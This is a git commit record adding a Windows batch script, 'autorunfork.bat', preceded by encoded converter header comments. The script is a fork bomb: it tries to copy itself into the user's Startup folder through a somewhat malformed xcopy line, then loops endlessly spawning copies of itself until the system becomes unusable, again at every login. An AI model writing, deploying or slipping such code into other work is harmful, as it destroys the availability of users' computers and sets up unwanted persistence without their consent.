efd067f9c93408ea0535b715af14e5c1fb6848ce
Ethaniel-Ramsgoat <68842475+Ethaniel-Ramsgoat@users.noreply.github.com>
2022-06-03 12:10:45 +1200

    Add files via upload

---
+++ autorunfork.bat
@@ -0,0 +1,38 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFD5ARAWMAE+1EbsQ5+n//NaCsF8SRqw2e4C7
+::YAwzuBVtJxjWCl3EqQJhSA==
+::ZR4luwNxJguZRRmU9VEjPxRGSGQ=
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+IeA==
+::cxY6rQJ7JhzQF1fEqQJhZks0
+::ZQ05rAF9IBncCkqN+0xwdVsFAlTi
+::ZQ05rAF9IAHYFVzEqQIDPBpGWBGSfE+VRpsz3KjJ2sTn
+::eg0/rx1wNQPfEVWB+kM9LVsJDCCNfEW1EvUu/eab
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQIHLRpEQwqLL26+RqcJ5qj04aqUtkwPQPcvOJneyKeHL+5T5UOkUblt+FVu2Pk5Ins=
+::dhA7uBVwLU+EWHuI9UE7aD1bXhaHL3/a
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATE0QICKRZHSwuDKCvoVudOiA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRms+1I1aAJbWUSKPX2/RpEZ5ub04aqJp0wPVvt/b4fe1PSaKOkAqlfxe4VN
+::Zh4grVQjdCyDJGyX8VAjFD5ARAWMAE+1BaAR7ebv/NaVt0MSWvEreZ3Pz6SIL/IY6Erpd9gozn86
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+xcopy <autorunfork.bat> C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+:fork
+start %0
+%0|%0
+goto :fork
